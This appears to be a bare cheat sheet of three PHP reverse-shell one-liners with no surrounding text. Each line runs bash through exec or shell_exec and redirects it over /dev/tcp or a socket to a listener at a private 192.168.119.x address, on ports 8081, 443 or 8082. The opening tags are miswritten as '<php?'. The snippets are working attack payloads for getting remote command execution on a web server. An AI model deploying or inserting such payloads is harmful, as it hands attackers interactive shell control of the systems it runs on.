```php
<php? exec("/bin/bash -l > /dev/tcp/192.168.119.201/8081 0<&1 2>&1") ; ?>
```

```php
<php? $sock=fsockopen("192.168.119.155",443);exec("/bin/bash -i <&3 >&3 2>&3"); ?>
```

```php
<php? shell_exec("/bin/bash -l > /dev/tcp/192.168.119.201/8082 0<&1 2>&1") ; ?>
```


